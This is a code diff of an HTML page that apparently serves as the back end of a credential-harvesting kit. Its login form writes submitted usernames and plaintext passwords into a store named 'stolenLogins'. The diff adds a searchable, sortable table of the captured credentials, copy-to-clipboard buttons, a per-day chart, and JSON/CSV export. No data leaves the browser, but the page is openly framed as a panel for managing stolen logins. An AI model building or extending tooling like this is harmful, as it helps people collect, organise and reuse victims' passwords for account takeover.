@@ -1,37 +1,42 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Admin Dashboard</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
-    body { font-family: "Inter" sans serif }
-    .card {
-      background: white;
-      border-radius: 12px;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-    }
-    .remove-btn {
-      cursor: pointer;
-      color: #ef4444;
-    }
-    .remove-btn:hover {
-      color: #dc2626;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Fancy Admin Dashboard</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<style>
+  @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
+  body { font-family: "Inter", sans-serif; }
+  .card { background: white; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin-bottom: 1.5rem; padding: 1.5rem; }
+  .remove-btn, .copy-btn, .export-btn { cursor: pointer; transition: color 0.2s; }
+  .remove-btn:hover { color: #dc2626; }
+  .copy-btn:hover { color: #2563eb; }
+  .export-btn:hover { opacity: 0.8; }
+  th { cursor: pointer; user-select: none; }
+</style>
 </head>
 <body class="bg-gray-100 min-h-screen p-6">
-  <div class="max-w-3xl mx-auto">
-    <h1 class="text-3xl font-bold text-gray-900 mb-6">Admin Dashboard</h1>
-    <div class="card p-6 mb-6">
-      <h2 class="text-xl font-semibold text-gray-700 mb-4">Captured Logins</h2>
-      <div class="overflow-y-auto max-h-96" id="loginList"></div>
-    </div>
-    <div class="card p-6">
-      <h2 class="text-xl font-semibold text-gray-700 mb-4">Stats</h2>
-      <div class="grid grid-cols-2 gap-4 text-center">
+
+<div class="max-w-7xl mx-auto space-y-6">
+
+  <!-- Login Form -->
+  <div class="card">
+    <h1 class="text-2xl font-bold text-gray-800 mb-4">Login Form</h1>
+    <form id="loginForm" class="space-y-4">
+      <input type="text" id="username" placeholder="Username" class="w-full p-3 border rounded-lg focus:ring-2 focus:ring-blue-400" required>
+      <input type="password" id="password" placeholder="Password" class="w-full p-3 border rounded-lg focus:ring-2 focus:ring-blue-400" required>
+      <button type="submit" class="w-full bg-blue-600 text-white py-3 px-4 rounded-lg hover:bg-blue-700 transition">Login</button>
+    </form>
+  </div>
+
+  <!-- Stats & Charts -->
+  <div class="grid md:grid-cols-2 gap-6">
+
+    <div class="card">
+      <h2 class="text-xl font-semibold mb-4">Stats</h2>
+      <div class="grid grid-cols-2 gap-4 text-center mb-4">
         <div class="p-4 bg-blue-50 rounded-lg">
           <p class="text-sm text-gray-500">Total Logins</p>
           <p class="text-2xl font-bold text-blue-600" id="totalLogins">0</p>
@@ -41,49 +46,193 @@
           <p class="text-2xl font-bold text-green-600" id="lastLogin">N/A</p>
         </div>
       </div>
+      <canvas id="loginChart" class="w-full h-64"></canvas>
     </div>
+
+    <div class="card">
+      <h2 class="text-xl font-semibold mb-4">Export / Search</h2>
+      <div class="flex flex-col gap-2 mb-4">
+        <input type="text" id="searchInput" placeholder="Search logins..." class="p-2 border rounded-lg">
+        <div class="flex gap-2">
+          <button id="exportJSON" class="export-btn bg-green-500 text-white px-4 py-2 rounded hover:bg-green-600 transition">Export JSON</button>
+          <button id="exportCSV" class="export-btn bg-yellow-500 text-white px-4 py-2 rounded hover:bg-yellow-600 transition">Export CSV</button>
+          <button id="clearAllBtn" class="bg-red-500 text-white px-4 py-2 rounded hover:bg-red-600 transition">Clear All</button>
+        </div>
+      </div>
+
+      <div class="overflow-x-auto">
+        <table id="loginTable" class="min-w-full divide-y divide-gray-200 rounded-lg overflow-hidden">
+          <thead class="bg-gray-200 sticky top-0">
+            <tr>
+              <th data-sort="username" class="px-3 py-2 text-left">Username</th>
+              <th data-sort="password" class="px-3 py-2 text-left">Password</th>
+              <th data-sort="timestamp" class="px-3 py-2 text-left">Timestamp</th>
+              <th class="px-3 py-2 text-left">Actions</th>
+            </tr>
+          </thead>
+          <tbody class="bg-white divide-y divide-gray-100"></tbody>
+        </table>
+      </div>
+
+      <!-- Pagination -->
+      <div class="flex justify-center gap-2 mt-4" id="pagination"></div>
+    </div>
+
   </div>
 
-  <script>
-    document.addEventListener("DOMContentLoaded", function() {
-      const loginList = document.getElementById("loginList")
-      const totalLogins = document.getElementById("totalLogins")
-      const lastLogin = document.getElementById("lastLogin")
+</div>
 
-      function updateAdminDisplay() {
-        try {
-          let storedData = JSON.parse(localStorage.getItem("stolenLogins") || "[]")
-          loginList.innerHTML = ""
-          if (storedData.length === 0) {
-            loginList.innerHTML = '<pre class="text-gray-600 whitespace-pre-wrap bg-gray-50 p-4 rounded-lg">No logins yet</pre>'
-          } else {
-            storedData.forEach((entry, index) => {
-              const div = document.createElement("div")
-              div.className = "bg-gray-50 p-4 rounded-lg mb-2 flex justify-between items-center"
-              div.innerHTML = `<span>Username: ${entry.username} | Password: ${entry.password} | Time: ${entry.timestamp}</span><span class="remove-btn" onclick="removeLogin(${index})">Remove</span>`
-              loginList.appendChild(div)
-            })
-          }
-          totalLogins.textContent = storedData.length
-          lastLogin.textContent = storedData.length > 0 ? storedData[storedData.length - 1].timestamp : "N/A"
-        } catch (err) {
-          console.error("Update admin display error:", err)
-        }
-      }
+<script>
+const loginForm = document.getElementById("loginForm");
+const loginTableBody = document.querySelector("#loginTable tbody");
+const totalLogins = document.getElementById("totalLogins");
+const lastLogin = document.getElementById("lastLogin");
+const clearAllBtn = document.getElementById("clearAllBtn");
+const searchInput = document.getElementById("searchInput");
+const paginationDiv = document.getElementById("pagination");
+const exportJSONBtn = document.getElementById("exportJSON");
+const exportCSVBtn = document.getElementById("exportCSV");
+const loginChartCtx = document.getElementById("loginChart");
 
-      window.removeLogin = function(index) {
-        try {
-          let storedData = JSON.parse(localStorage.getItem("stolenLogins") || "[]")
-          storedData.splice(index, 1)
-          localStorage.setItem("stolenLogins", JSON.stringify(storedData))
-          updateAdminDisplay()
-        } catch (err) {
-          console.error("Remove login error:", err)
-        }
-      }
+let currentPage = 1;
+const pageSize = 5;
+let currentSort = { key: "timestamp", asc: false };
+let loginChart;
 
-      updateAdminDisplay()
-    })
-  </script>
+function getStoredLogins() { return JSON.parse(localStorage.getItem("stolenLogins") || "[]"); }
+function saveLogins(data) { localStorage.setItem("stolenLogins", JSON.stringify(data)); }
+function sortData(data) {
+  const { key, asc } = currentSort;
+  return data.sort((a,b) => (a[key]<b[key]? (asc?-1:1):(a[key]>b[key]?(asc?1:-1):0)));
+}
+function copyToClipboard(text){ navigator.clipboard.writeText(text); }
+
+function renderChart(data){
+  const counts = {};
+  data.forEach(entry=>{
+    const date = new Date(entry.timestamp).toLocaleDateString();
+    counts[date] = (counts[date]||0)+1;
+  });
+  const labels = Object.keys(counts);
+  const values = Object.values(counts);
+
+  if(loginChart) loginChart.destroy();
+  loginChart = new Chart(loginChartCtx, {
+    type: 'line',
+    data: { labels, datasets:[{ label:'Logins per day', data: values, backgroundColor:'rgba(59,130,246,0.2)', borderColor:'rgba(59,130,246,1)', tension:0.3, fill:true }] },
+    options: { responsive:true, plugins:{ legend:{display:true} }, scales:{ y:{beginAtZero:true} } }
+  });
+}
+
+function renderTable(filter="") {
+  let data = getStoredLogins().filter(entry =>
+    entry.username.toLowerCase().includes(filter.toLowerCase()) ||
+    entry.password.toLowerCase().includes(filter.toLowerCase())
+  );
+  data = sortData(data);
+
+  const totalPages = Math.ceil(data.length/pageSize)||1;
+  if(currentPage>totalPages) currentPage=totalPages;
+  const start=(currentPage-1)*pageSize;
+  const pageData = data.slice(start,start+pageSize);
+
+  loginTableBody.innerHTML="";
+  if(pageData.length===0){
+    loginTableBody.innerHTML=`<tr><td colspan="4" class="px-3 py-2 text-center text-gray-400">No logins found</td></tr>`;
+  } else {
+    pageData.forEach((entry,index)=>{
+      const row=document.createElement("tr");
+      row.className="hover:bg-gray-50 transition";
+      row.innerHTML=`
+        <td class="px-3 py-2">${entry.username} <button class="copy-btn text-blue-500 ml-1" title="Copy username">📋</button></td>
+        <td class="px-3 py-2">${entry.password} <button class="copy-btn text-blue-500 ml-1" title="Copy password">📋</button></td>
+        <td class="px-3 py-2">${entry.timestamp}</td>
+        <td class="px-3 py-2"><span class="remove-btn text-red-500">Remove</span></td>
+      `;
+      row.querySelectorAll(".copy-btn").forEach((btn,i)=>{
+        btn.addEventListener("click",()=>copyToClipboard(i===0?entry.username:entry.password));
+      });
+      row.querySelector(".remove-btn").addEventListener("click",()=>{
+        let stored=getStoredLogins();
+        const idx=stored.indexOf(entry);
+        if(idx>-1){stored.splice(idx,1); saveLogins(stored); renderTable(searchInput.value);}
+      });
+      loginTableBody.appendChild(row);
+    });
+  }
+
+  // Pagination
+  paginationDiv.innerHTML="";
+  for(let i=1;i<=totalPages;i++){
+    const btn=document.createElement("button");
+    btn.textContent=i;
+    btn.className=`px-3 py-1 rounded ${i===currentPage?'bg-blue-600 text-white':'bg-gray-200 text-gray-700 hover:bg-gray-300'}`;
+    btn.addEventListener("click",()=>{currentPage=i; renderTable(searchInput.value);});
+    paginationDiv.appendChild(btn);
+  }
+
+  // Stats
+  const stored=getStoredLogins();
+  totalLogins.textContent=stored.length;
+  const last=stored.slice(-1)[0];
+  lastLogin.textContent=last?last.timestamp:"N/A";
+
+  // Update chart
+  renderChart(stored);
+}
+
+// Event Listeners
+loginForm.addEventListener("submit",e=>{
+  e.preventDefault();
+  const username=document.getElementById("username").value.trim();
+  const password=document.getElementById("password").value.trim();
+  if(username && password){
+    const stored=getStoredLogins();
+    stored.push({username,password,timestamp:new Date().toISOString()});
+    saveLogins(stored);
+    renderTable();
+    loginForm.reset();
+  }
+});
+
+searchInput.addEventListener("input",()=>{currentPage=1; renderTable(searchInput.value);});
+clearAllBtn.addEventListener("click",()=>{
+  if(confirm("Clear all logins?")){ localStorage.removeItem("stolenLogins"); renderTable(); }
+});
+
+// Export
+exportJSONBtn.addEventListener("click",()=>{
+  const data=getStoredLogins();
+  const blob=new Blob([JSON.stringify(data, null, 2)], {type:"application/json"});
+  const a=document.createElement("a");
+  a.href=URL.createObjectURL(blob);
+  a.download="logins.json";
+  a.click();
+});
+exportCSVBtn.addEventListener("click",()=>{
+  const data=getStoredLogins();
+  const csv=["username,password,timestamp"];
+  data.forEach(d=>csv.push(`${d.username},${d.password},${d.timestamp}`));
+  const blob=new Blob([csv.join("\n")], {type:"text/csv"});
+  const a=document.createElement("a");
+  a.href=URL.createObjectURL(blob);
+  a.download="logins.csv";
+  a.click();
+});
+
+// Sorting
+document.querySelectorAll("#loginTable th[data-sort]").forEach(th=>{
+  th.addEventListener("click",()=>{
+    const key=th.getAttribute("data-sort");
+    if(currentSort.key===key) currentSort.asc=!currentSort.asc;
+    else currentSort={key,asc:true};
+    renderTable(searchInput.value);
+  });
+});
+
+// Initial render
+renderTable();
+</script>
+
 </body>
 </html>
